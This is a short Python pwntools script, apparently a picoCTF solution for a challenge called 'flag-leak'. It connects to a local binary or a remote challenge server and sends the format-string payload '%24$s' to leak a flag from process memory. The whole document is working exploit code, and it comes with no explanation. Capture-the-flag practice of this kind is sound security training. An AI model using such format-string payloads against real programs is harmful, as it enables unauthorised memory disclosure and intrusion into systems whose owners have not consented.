#!/usr/bin/env python3

from sys import argv
from pwn import *

BIN = './flag-leak.bin'

IP = 'saturn.picoctf.net'
PORT = 56587

elf = ELF(BIN)


def open_instance():
    if 'remote' in argv:
        return remote(IP, PORT)
    return process(BIN)


# generate payload
PAYLOAD_MAX_LEN = 127

payload = b'%24$s'

# send payload
assert(len(payload) <= PAYLOAD_MAX_LEN)
p = open_instance()
p.readuntil(b'Tell me a story and then I\'ll tell you one >> ')
p.sendline(payload)

# read flag
flag = p.recvall().strip()
print(flag.decode())
